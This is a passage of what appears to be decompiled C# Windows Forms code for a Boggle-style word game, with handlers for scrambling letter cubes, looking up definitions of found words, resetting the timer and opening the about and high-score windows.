      this.mnuEndGame_Click((object) this.btnContinue, new EventArgs());
      this.mnuNewGame_Click((object) this.mnuEndGame, new EventArgs());
    }

    private void btnScramble_Click_1(object sender, EventArgs e)
    {
      this.txtMain.Text = "Re-Scrambling...";
      this.txtMain.Refresh();
      this.lstCompFoundWords.DataSource = (object) null;
      this.lstCompFoundWords.Items.Clear();
      this.lstHumanWordsFound.Items.Clear();
      this.FoundWords.Clear();
      try
      {
        foreach (Cube cube in (CollectionBase) modGlobal.Cubes)
        {
          modGlobal.myCube = cube;
          modGlobal.myCube.CubeLabel.Visible = false;
          modGlobal.myCube.CubeHighLight = System.Drawing.Color.LightGray;
          modGlobal.myCube.CubeTextColor = System.Drawing.Color.DarkBlue;
          modGlobal.myCube.SetRndCubeLetter();
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
      modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Spinning;
      this.tmrContMain.Enabled = false;
      modGlobal.Cubes.ScrambleCubes();
      while (modGlobal.Cubes.CubesAreScrambling)
        Application.DoEvents();
      this.tmrContMain.Enabled = true;
      modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Normal;
      this.picCubesUp.Refresh();
      try
      {
        foreach (Cube cube in (CollectionBase) modGlobal.Cubes)
        {
          modGlobal.myCube = cube;
          modGlobal.myCube.CubeLabel.Visible = true;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
    }

    private void mnuEnableWordValidation_Click(object sender, EventArgs e) => this.mnuEnableWordValidation.Checked = !this.mnuEnableWordValidation.Checked;

    private void lstHumanWordsFound_MouseUp(object sender, MouseEventArgs e)
    {
      if (!this.mnuEnableDefSearch.Checked)
        return;
      while (this.ShowWordThread.ThreadState == System.Threading.ThreadState.Running)
        Application.DoEvents();
      this.txtMain.Text = "Querying Defenition...";
      Application.DoEvents();
      this.txtMain.Text = modFindWords.GetDef(this.lstHumanWordsFound.GetItemText(RuntimeHelpers.GetObjectValue(this.lstHumanWordsFound.SelectedItem)));
      this.txtMain.SelectionStart = 0;
    }

    private void btnFinish_Click(object sender, EventArgs e)
    {
      this.Sec = 0.0;
      this.Min = 0;
      this.tmrMain.TimerText = "000";
    }

    private void mnuTips_Click(object sender, EventArgs e)
    {
      frmWelcome frmWelcome = new frmWelcome();
      frmWelcome.chkMain.Visible = false;
      frmWelcome.Show();
    }

    private void mnuAbout_Click(object sender, EventArgs e) => new frmAbout().Show();

    private void mnuHighScores_Click(object sender, EventArgs e) => new frmHighScores().Show();
  }
}
